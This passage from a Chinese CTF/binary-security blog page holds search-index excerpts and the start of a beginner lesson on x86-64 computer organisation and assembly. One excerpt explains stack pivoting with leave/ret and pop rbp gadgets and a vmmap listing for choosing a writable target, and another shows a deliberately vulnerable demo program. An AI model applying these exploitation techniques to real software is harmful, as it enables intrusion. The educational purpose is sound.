+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">setvbuf</span>(stdout, null, _ionbf, <span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">setvbuf</span>(stderr, null, _ionbf, <span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">vuln</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>使用以下命令编译</p>'><a href=/posts/ret2dlresolve/><span>Ret2dlresolve</span><small>posts/</small></a></li><li data-search-item data-search-text='wsl2的配置与使用 posts vm <p>wsl2是一款现代的 linux 虚拟机解决方案，相较于以往的 wsl1 模拟了完整的 linux 内核，且可以非常方便的直接访问 windows 本机的文件，你可以通过 wsl2 配置不同的 linux 发行版进行使用。</p>
+<h2 id="windows-预先设置">windows 预先设置</h2>
+<p>首先确保你的电脑使用的系统是 <code>windows 11</code> ，理论上来说 win10 也可以但需要一些神秘代码的帮助这里不作多余讨论
+在正式开始之前请确认你打开了虚拟化，你可以按下 ctrl + shift +esc 在任务管理器的性能选项中查看
+<figure class="article-image"><img src="/posts/wsl2-setup/image.png" width="985" height="685" alt="任务管理器中显示虚拟化已启用" loading="lazy"></figure>
+
+如果你发现这一项没有启用，你应当去搜索自己购买的电脑的主板厂家的 bios 使用方法与虚拟化支持的开启，一般都可以直接搜到
+这里附上微星的设置方法<a href="https://zhuanlan.zhihu.com/p/370466620">微星主板如何开启vt</a></p>
+<p>其他厂家搜索关键词差不多</p>
+<p>当你打开虚拟化后，接下来需要设置<code>windows 功能</code>
+在windows任务栏的搜索框中输入 <code>启用或关闭 windows 功能</code>
+<figure class="article-image"><img src="/posts/wsl2-setup/image-1.png" width="333" height="81" alt="windows 搜索中的启用或关闭 windows 功能入口" loading="lazy"></figure>
+
+部分情况下单独搜索<code>功能</code>，开启这个选项卡，找到其中以下几项并开启</p>
+<ul>
+<li>virtual machine platform</li>
+<li>windows subsystem for linux</li>
+<li>hyper-v</li>
+<li>windows hypervisor platform</li>
+</ul>
+<p>因为系统版本的原因，你这里可能会有几项使用的是中文翻译，也有可能会有几项缺少，但是主要的<code>windows subsystem for linux</code>和<code>virtual machine platform</code>一定要开启</p>
+<p><figure class="article-image"><img src="/posts/wsl2-setup/image-2.png" width="413" height="678" alt="windows 功能中的 wsl 与虚拟机平台选项" loading="lazy"></figure>
+
+完成后若提示需要重启电脑则请尝试重启以完成设置</p>
+<p>如果除了 wsl 你还要使用其他的虚拟机如vmware之类的，请务必使用 vmware 25h2 以上的版本解决虚拟化独占问题，不然可能你两个都用不了</p>'><a href=/posts/wsl2-setup/><span>wsl2的配置与使用</span><small>posts/</small></a></li><li data-search-item data-search-text='两百行代码搓一个原始神经网络 posts  <p>这个文章主要还是因为这周研究了挺久的ai相关的东西，然后休闲时刷视频发现了这个</p>
+<p><a href="https://www.bilibili.com/video/bv1zp4y1g7g5/?share_source=copy_web&amp;amp;vd_source=853200eb173acad552081e78b7529b49">we&amp;rsquo;re building computers wrong</a></p>
+<p>闲的没事尝试复现了一下其中的第一个demo，这也是是一个很简单但很有意思的demo
+如果你闲的蛋疼可以考虑看一下视频，就能大致知到原理了，当然你也可以考虑跳过，我在下面简述一下</p>
+<p>另外完整的代码我已经放在 github 了，点一下我头像下面的连接就可以找到</p>
+<h2 id="基本原理">基本原理</h2>
+<p>如果你看了视频，这一步可以跳过</p>
+<p>1958年，frank rosenblatt提出了一种模仿神经发射信号方式的机器 mark i 感知机，mark i 的输入层是一个 20x20 的感光单元矩阵，共400个光电探测器，用于&amp;quot;看&amp;quot;图像，并将光学信号转化为电信号，神经元之间连接的&amp;quot;权重&amp;quot;被编码在电位器中
+回到神经细胞(这里不是严格生物意义上的神经细胞)上，一个神经细胞可以有两种激活状态，激活或者不激活，而神经细胞之间可以有连接，如果一个神经细胞连接数个神经细胞，这个细胞的激活状态由其他神经细胞决定，这些神经细胞的激活与不激活的状态通过连接传递给这个神经细胞，不同的神经细胞之间的连接强度不同，部分连接可以起到刺激作用，部分为抑制作用，当整合后的信号超过某个阈值，这个神经细胞就会激活</p>
+<p>我们可以把这里的连接强度视作一种权重，不同神经细胞的输入乘以对应的权重的和是否能够达到某个阈值决定下一个神经细胞的状态，因此我们可以很简单的模拟出神经细胞的运作方式，复现一下 mark i 感知机
+有可能你看的一头雾水，直接上实战演示</p>
+<h2 id="搓一个原始神经网络">搓一个原始神经网络</h2>
+<p>这里的原理并不是特别复杂，因此你甚至可以使用c语言搓一个出来，所以我们就直接掏出巨大的c语言，直接做一个简单的demo使得可以分辨方形和圆形</p>
+<h3 id="基本处理">基本处理</h3>
+<p>为了方便接下来的代码编写，我们先搓一个common.h文件</p>
+<h4 id="宏">宏</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#ifndef common_h
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define common_h
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;stdio.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;stdlib.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;string.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define width  20         </span><span style="color:#8b949e;font-style:italic">// 图形宽度
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define height 20         </span><span style="color:#8b949e;font-style:italic">// 图形高度
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define bias   20.0f      </span><span style="color:#8b949e;font-style:italic">// 分类阈值
+</span></span></span></code></pre></div><h4 id="神经元输入">神经元输入</h4>
+<p>首先我们需要一个 <code>20*20</code> 的&amp;quot;感光单元矩阵&amp;quot;，当然我们使用一个 <code>20*20</code> char数组就行了,数组的每个索引处可以是一个数，这里我们为了方便，只采用0和1，这<code>20*20</code>的每个神经元的权重我们同样采用一个数组保存，但是这个没办法缩减，使用一个float数组</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">char</span> image[height][width];
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">float</span> weights[height][width];
+</span></span></code></pre></div><h4 id="图像的保存与加载">图像的保存与加载</h4>
+<p>这里为了简单方便的表示，我们就不使用.png .jpg之类的复杂的图片，我们使用一个.bin文件，每个字节代表一个像素，每个图片20*20=400个字节</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">inline</span> <span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">load_image</span>(<span style="color:#ff7b72">const</span> <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>filepath, image img) {
+</span></span><span style="display:flex;"><span>    file <span style="color:#ff7b72;font-weight:bold">*</span>f <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">fopen</span>(filepath, <span style="color:#a5d6ff">&amp;#34;rb&amp;#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>f) <span style="color:#ff7b72">return</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">size_t</span> n <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">fread</span>(img, <span style="color:#ff7b72">sizeof</span>(<span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">char</span>), height <span style="color:#ff7b72;font-weight:bold">*</span> width, f);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">fclose</span>(f);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> (n <span style="color:#ff7b72;font-weight:bold">==</span> height <span style="color:#ff7b72;font-weight:bold">*</span> width) <span style="color:#ff7b72;font-weight:bold">?</span> <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">inline</span> <span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">save_weights</span>(<span style="color:#ff7b72">const</span> weights w, <span style="color:#ff7b72">const</span> <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>path) {
+</span></span><span style="display:flex;"><span>    file <span style="color:#ff7b72;font-weight:bold">*</span>f <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">fopen</span>(path, <span style="color:#a5d6ff">&amp;#34;wb&amp;#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>f) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">fprintf</span>(stderr, <span style="color:#a5d6ff">&amp;#34;error: cannot write weights to %s</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&amp;#34;</span>, path);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">fwrite</span>(w, <span style="color:#ff7b72">sizeof</span>(<span style="color:#ff7b72">float</span>), height <span style="color:#ff7b72;font-weight:bold">*</span> width, f);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">fclose</span>(f);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="连接权重的加载">连接权重的加载</h4>
+<p>同样，我们可以给将权重保存到.bin文件，并从此加载</p>'><a href=/posts/neural-network-from-scratch/><span>两百行代码搓一个原始神经网络</span><small>posts/</small></a></li><li data-search-item data-search-text='栈迁移 - pivoting posts ctf <h1 id="栈迁移">栈迁移</h1>
+<p>之前答应某人写一篇文章讲栈迁移，这里附带一些栈相关的知识，尽可能全面的讲述栈和栈迁移，结合例题应用
+文章讨论的内容都建立在<code>x86-64 linux</code>上</p>
+<h2 id="栈相关寄存器">栈相关寄存器</h2>
+<h3 id="rsp">rsp</h3>
+<ul>
+<li>指向当前栈顶，决定 cpu 从哪里取返回地址与 rop 数据</li>
+</ul>
+<h3 id="rbp">rbp</h3>
+<ul>
+<li>指向当前函数栈帧基址，用作稳定的栈内数据定位与栈迁移跳板</li>
+</ul>
+<h2 id="栈相关的指令">栈相关的指令</h2>
+<p>这里只讲一些需要特别注意的指令，add sub一类明显的就略过了</p>
+<h3 id="push">push</h3>
+<p>push是一个压栈指令，可以将寄存器立即数或内存中的数据压入栈中，这条指令的具体操作包括</p>
+<ol>
+<li>rsp - 8</li>
+<li>将指定数据写在rsp指向的内存处
+需要注意是先rsp减小，再写入数据，当压入立即数时会先符号扩展至8字节，再压入</li>
+</ol>
+<h3 id="pop">pop</h3>
+<p>pop与push相反，用于弹栈，可以将rsp处的值弹出，他的流程大致为</p>
+<ol>
+<li>弹出rsp处的值</li>
+<li>rsp + 8
+需要注意pop事实上只移动了rsp，原本rsp处弹栈的数据并不会被清理</li>
+</ol>
+<h3 id="call">call</h3>
+<p>事实上call是一条隐式的push，当我们通过call调用某个地址时，实际做的是</p>
+<ol>
+<li>push rip</li>
+<li>jmp addr
+它会将call的下一条指令的地址压，并jmp到刚刚call的地址</li>
+</ol>
+<h3 id="ret">ret</h3>
+<p>和call相反，ret则是一条隐式的pop，当执行ret时</p>
+<ol>
+<li>pop rip</li>
+<li>jmp rip
+会将之前call压栈的返回地址pop到rip，并跳转</li>
+</ol>
+<h3 id="leave">leave</h3>
+<p>leave则是栈迁移的一条关键指令，主要作用是销毁栈
+执行的时候</p>
+<ol>
+<li>mov rsp, rbp</li>
+<li>pop rbp
+会将rsp移动到rbp处，并将当前位置的地址pop到rbp完成对rbp的移动</li>
+</ol>
+<h2 id="如何迁移">如何迁移</h2>
+<p>对于迁移栈，我们的目的是将栈移动到一个更加可控的位置，或利用有限的溢出大小实现更长的rop链，也可以通过多次栈迁移布置特定的数据结构栈风水等</p>
+<h3 id="gadget">gadget</h3>
+<p>对于gadget的选取，一般有两种选择</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">pop</span> rbp
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">retn</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">leave</span>
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">retn</span>
+</span></span></code></pre></div><p>这些gadget可以帮助我们控制rbp进而间接控制rsp</p>
+<h3 id="迁移目标位置的选择">迁移目标位置的选择</h3>
+<p>可以通过gdb调试寻找一些可读可写的区域</p>
+<pre tabindex="0"><code>pwndbg&amp;gt; vmmap
+legend: stack | heap | code | data | wx | rodata
+             start                end perm     size  offset file (set vmmap-prefer-relpaths on)
+          0x400000           0x401000 r--p     1000       0 pwn
+          0x401000           0x402000 r-xp     1000    1000 pwn
+          0x402000           0x403000 r--p     1000    2000 pwn
+          0x403000           0x404000 r--p     1000    2000 pwn
+          0x404000           0x405000 rw-p     1000    3000 pwn
+          0x405000           0x426000 rw-p    21000       0 [heap]
+    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7c28000     0x7ffff7db0000 r-xp   188000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7db0000     0x7ffff7dff000 r--p    4f000  1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7dff000     0x7ffff7e03000 r--p     4000  1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7e03000     0x7ffff7e05000 rw-p     2000  202000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7e05000     0x7ffff7e12000 rw-p     d000       0 [anon_7ffff7e05]
+    0x7ffff7fae000     0x7ffff7fb1000 rw-p     3000       0 [anon_7ffff7fae]
+    0x7ffff7fbd000     0x7ffff7fbf000 rw-p     2000       0 [anon_7ffff7fbd]
+    0x7ffff7fbf000     0x7ffff7fc3000 r--p     4000       0 [vvar]
+    0x7ffff7fc3000     0x7ffff7fc5000 r-xp     2000       0 [vdso]
+    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7fc6000     0x7ffff7ff1000 r-xp    2b000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffffffde000     0x7ffffffff000 rw-p    21000       0 [stack]
+</code></pre><p>以这里为例，<code> 0x404000           0x405000 rw-p     1000    3000 pwn</code>就是一个很不错的选择</p>'><a href=/posts/stack-pivoting/><span>栈迁移 - Pivoting</span><small>posts/</small></a></li><li class=search-empty hidden>No matching pages.</li></ul></dialog><dialog class="site-dialog shortcut-dialog" id=shortcut-dialog aria-labelledby=shortcut-title><form method=dialog class=dialog-header><h2 id=shortcut-title>Keyboard shortcuts</h2><button type=submit aria-label="Close shortcuts">×</button></form><dl><div><dt><kbd>Ctrl</kbd> + <kbd>K</kbd></dt><dd>Open search</dd></div><div><dt><kbd>Esc</kbd></dt><dd>Close menu or dialog</dd></div></dl></dialog><div class=workspace><aside class=explorer aria-label="Workspace explorer"><div class=panel-header><p class=panel-title>Explorer</p><button class=panel-collapse type=button data-view-toggle=explorer aria-label="Collapse Explorer" title="Collapse Explorer">‹</button></div><nav class=file-tree aria-label="Workspace files"><p class=workspace-root>⌄ workspace/</p><ul><li class=tree-directory><a class=tree-link href=/posts/><span aria-hidden=true>⌄</span>posts/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/posts/ret2dlresolve/><span aria-hidden=true>·</span>Ret2dlresolve</a></li><li><a class="tree-link tree-file" href=/posts/wsl2-setup/><span aria-hidden=true>·</span>wsl2的配置与使用</a></li><li><a class="tree-link tree-file" href=/posts/neural-network-from-scratch/><span aria-hidden=true>·</span>两百行代码搓一个原始神经网络</a></li><li><a class="tree-link tree-file" href=/posts/stack-pivoting/><span aria-hidden=true>·</span>栈迁移 - Pivoting</a></li></ul></li><li class=tree-directory><a class="tree-link is-current" href=/how2pwn/><span aria-hidden=true>⌄</span>How2pwn/</a><ul class=tree-children><li><a class="tree-link tree-file is-current" href=/how2pwn/0-0-computer-structure/><span aria-hidden=true>·</span>0-0 计算机组成初步</a></li></ul></li><li class=tree-directory><a class=tree-link href=/research/><span aria-hidden=true>⌄</span>research/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/research/glibc-large-tcache/><span aria-hidden=true>·</span>2.4x 的 tcache 机制分析</a></li><li><a class="tree-link tree-file" href=/research/perf-side-channel-attack/><span aria-hidden=true>·</span>Perf与简单的侧信道攻击</a></li></ul></li><li class=tree-directory><a class=tree-link href=/projects/><span aria-hidden=true>⌄</span>projects/</a><ul class=tree-children></ul></li><li class=tree-directory><a class=tree-link href=/ctf/><span aria-hidden=true>⌄</span>ctf/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/ctf/geek-challenge-2025-wp/><span aria-hidden=true>·</span>Geek Challenge 2025 WP</a></li></ul></li><li class=tree-directory><a class=tree-link href=/links/><span aria-hidden=true>⌄</span>links/</a><ul class=tree-children><li><a class="tree-link tree-file" href=/links/><span aria-hidden=true>·</span>friends.json</a></li></ul></li><li class=tree-directory><a class=tree-link href=/about/><span aria-hidden=true>⌁</span>about/</a></li></ul></nav></aside><main class=main-content><div class=editor-pane><div class=article-layout><article class=article><header class=article-header><p class=path>How2pwn\0-0-computer_structure\index.md</p><h1>0-0 计算机组成初步</h1><div class=article-meta><time datetime=2026-08-02>2026-08-02</time>
+<span>8 min read</span></div><nav class=terms aria-label=Categories><a href=/categories/basic/>#basic</a></nav><nav class=terms aria-label=Tags><a href=/tags/re/>re</a><a href=/tags/pwn/>pwn</a></nav></header><details class="article-toc article-toc-mobile" data-article-toc><summary>Table of contents</summary><nav class=table-of-contents><ul><li><a href=#计算机由哪些主要硬件组成>计算机由哪些主要硬件组成</a><ul><li><a href=#1-cpu-内部有什么>1. CPU 内部有什么</a></li><li><a href=#2-取指译码与执行>2. 取指、译码与执行</a></li><li><a href=#3-为什么需要不同层次的存储>3. 为什么需要不同层次的存储</a></li></ul></li><li><a href=#x86-64-寄存器>x86-64 寄存器</a><ul><li><a href=#1-通用寄存器>1. 通用寄存器</a></li><li><a href=#2-特殊寄存器>2. 特殊寄存器</a></li><li><a href=#3-子寄存器>3. 子寄存器</a></li></ul></li><li><a href=#汇编语言的基本写法>汇编语言的基本写法</a><ul><li><a href=#1-指令和操作数>1. 指令和操作数</a></li><li><a href=#2-内存寻址>2. 内存寻址</a></li><li><a href=#3-数据宽度与小端序>3. 数据宽度与小端序</a></li></ul></li><li><a href=#常见的数据传输指令>常见的数据传输指令</a><ul><li><a href=#1-mov复制数据>1. <code>mov</code>：复制数据</a></li><li><a href=#2-movzx-与-movsx扩展较小的数据>2. <code>movzx</code> 与 <code>movsx</code>：扩展较小的数据</a></li><li><a href=#3-lea计算有效地址>3. <code>lea</code>：计算有效地址</a></li><li><a href=#4-push-与-pop在栈上保存和取回数据>4. <code>push</code> 与 <code>pop</code>：在栈上保存和取回数据</a></li></ul></li><li><a href=#运算比较与标志位>运算、比较与标志位</a><ul><li><a href=#1-基本运算>1. 基本运算</a></li><li><a href=#2-常见状态标志>2. 常见状态标志</a></li><li><a href=#3-cmp比较两个值>3. <code>cmp</code>：比较两个值</a></li><li><a href=#4-test按位测试>4. <code>test</code>：按位测试</a></li></ul></li><li><a href=#控制流指令>控制流指令</a><ul><li><a href=#1-jmp无条件跳转>1. <code>jmp</code>：无条件跳转</a></li><li><a href=#2-条件跳转与-ifelse>2. 条件跳转与 <code>if/else</code></a></li><li><a href=#3-条件跳转与循环>3. 条件跳转与循环</a></li><li><a href=#4-call-与-ret>4. <code>call</code> 与 <code>ret</code></a></li></ul></li><li><a href=#栈与栈帧>栈与栈帧</a><ul><li><a href=#1-栈是什么>1. 栈是什么</a></li><li><a href=#2-一个典型栈帧>2. 一个典型栈帧</a></li><li><a href=#3-调用过程中栈如何变化>3. 调用过程中栈如何变化</a></li></ul></li><li><a href=#linux-x86-64-函数调用约定>Linux x86-64 函数调用约定</a><ul><li><a href=#1-参数与返回值>1. 参数与返回值</a></li><li><a href=#2-调用者保存与被调用者保存>2. 调用者保存与被调用者保存</a></li><li><a href=#3-栈对齐>3. 栈对齐</a></li><li><a href=#4-red-zone>4. Red zone</a></li></ul></li><li><a href=#综合示例从-c-函数到汇编>综合示例：从 C 函数到汇编</a></li><li><a href=#简单练习题>简单练习题</a><ul><li><a href=#练习-1追踪子寄存器>练习 1：追踪子寄存器</a></li><li><a href=#练习-2判断跳转>练习 2：判断跳转</a></li><li><a href=#练习-3追踪栈指针>练习 3：追踪栈指针</a></li><li><a href=#练习-4还原伪代码>练习 4：还原伪代码</a></li></ul></li></ul></nav></details><div class=article-body><h1 id=从-c-语言到汇编二进制安全需要的计算机组成基础>从 C 语言到汇编：二进制安全需要的计算机组成基础</h1><p>我们平时编写 C 语言程序时，习惯用变量、循环、判断和函数来描述程序逻辑：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>add</span>(<span style=color:#ff7b72>int</span> a, <span style=color:#ff7b72>int</span> b) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> a <span style=color:#ff7b72;font-weight:700>+</span> b;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>但是 CPU 并不认识 <code>int</code>、<code>return</code> 或函数名。源代码经过编译器处理后，会被翻译成机器指令；机器指令本质上是一串二进制数据。汇编语言则为这些机器指令提供了便于人类阅读的写法。上面的函数可能对应如下汇编逻辑：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>add:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>lea</span> <span style=color:#79c0ff;font-weight:700>eax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span> <span style=color:#f85149>+</span> <span style=color:#79c0ff;font-weight:700>rsi</span>]
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span></code></pre></div><p>对于普通软件开发，我们未必需要关心翻译后的结果；但在逆向工程、漏洞分析和恶意代码分析中，拿到的往往只有编译后的程序。此时，我们必须从寄存器、内存和汇编指令出发，重新理解程序做了什么。</p><p>本文不会完整讲授数字电路、流水线或缓存一致性等计算机组成原理课程内容，而是围绕二进制安全所需的主线展开：</p><blockquote><p>硬件如何协作 → CPU 如何保存数据 → 汇编指令如何操作数据和改变控制流 → 函数如何使用栈与寄存器。</p></blockquote><p>文中的汇编代码采用 <strong>x86-64 Intel 语法</strong>，运行环境默认为 <strong>Linux 用户态</strong>，函数调用遵循 <strong>System V AMD64 ABI</strong>。示例以讲清原理为第一目标，实际编译结果会随着编译器版本、优化等级和源代码写法发生变化。</p><h2 id=计算机由哪些主要硬件组成>计算机由哪些主要硬件组成</h2><p>一台计算机包含很多部件。对于分析普通用户态程序，我们首先需要认识 CPU、内存、外部存储、总线和输入输出设备。</p><table><thead><tr><th>部件</th><th>主要作用</th><th>与二进制分析的关系</th></tr></thead><tbody><tr><td>CPU</td><td>解释并执行机器指令，完成运算和控制</td><td>汇编指令最终在 CPU 中执行</td></tr><tr><td>内存（RAM）</td><td>临时保存正在运行的程序、代码和数据</td><td>代码、栈、堆和全局变量都位于进程的虚拟地址空间中</td></tr><tr><td>硬盘或固态硬盘</td><td>长期保存程序和文件，断电后数据仍存在</td><td>ELF 可执行文件最初存放在这里，运行时再由系统装入内存</td></tr><tr><td>总线</td><td>在 CPU、内存和设备之间传输地址、数据和控制信息</td><td>决定各硬件如何交换信息，但初学阶段不必深入电气细节</td></tr><tr><td>输入输出设备</td><td>让计算机与用户和外界交换数据</td><td>程序通常通过操作系统提供的接口访问这些设备</td></tr></tbody></table><h3 id=1-cpu-内部有什么>1. CPU 内部有什么</h3><p>为了便于理解，可以把 CPU 内部的重要部分概括为：</p><ul><li><strong>控制单元</strong>：取得指令、解释指令，并协调其他部件完成操作。</li><li><strong>运算单元</strong>：执行加减、比较、位运算等操作，也常被称为算术逻辑单元（ALU）。</li><li><strong>寄存器</strong>：CPU 内部容量很小但速度很快的存储位置，用来保存当前正在处理的数据、地址和状态。</li><li><strong>缓存</strong>：位于 CPU 与内存之间，用来保存近期可能再次使用的指令和数据，减少等待内存的时间。</li></ul><p>真实 CPU 的结构远比上述描述复杂，还包含多级流水线、分支预测、乱序执行等机制。不过从程序可见的角度看，我们暂时可以把它理解为一台不断读取并执行指令的机器。</p><h3 id=2-取指译码与执行>2. 取指、译码与执行</h3><p>CPU 执行程序时，会不断重复一个基本过程：</p><ol><li><strong>取指</strong>：根据指令指针指向的地址，从内存中取得下一条机器指令。</li><li><strong>译码</strong>：判断这条指令要做什么、操作数来自哪里。</li><li><strong>执行</strong>：完成数据传输、运算、访存或跳转，并更新相关寄存器。</li><li><strong>继续</strong>：如果没有发生跳转，就执行地址上的下一条指令；如果发生跳转，则从新的地址继续。</li></ol><p>例如，CPU 执行 <code>add eax, ebx</code> 时，需要读取 <code>EAX</code> 和 <code>EBX</code>，完成加法，把结果写回 <code>EAX</code>，同时更新部分状态标志。</p><h3 id=3-为什么需要不同层次的存储>3. 为什么需要不同层次的存储</h3><p>寄存器很快，却只有少量；内存容量大一些，但访问更慢；硬盘容量更大，也能长期保存数据，但速度远低于内存。计算机通过分层存储在速度、容量和成本之间取得平衡。</p><p>大致可以按照下面的顺序理解：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>速度快、容量小
+</span></span><span style=display:flex><span>    寄存器
+</span></span><span style=display:flex><span>      ↓
+</span></span><span style=display:flex><span>    CPU 缓存
+</span></span><span style=display:flex><span>      ↓
+</span></span><span style=display:flex><span>    内存（RAM）
+</span></span><span style=display:flex><span>      ↓
+</span></span><span style=display:flex><span>    SSD / HDD
+</span></span><span style=display:flex><span>速度慢、容量大
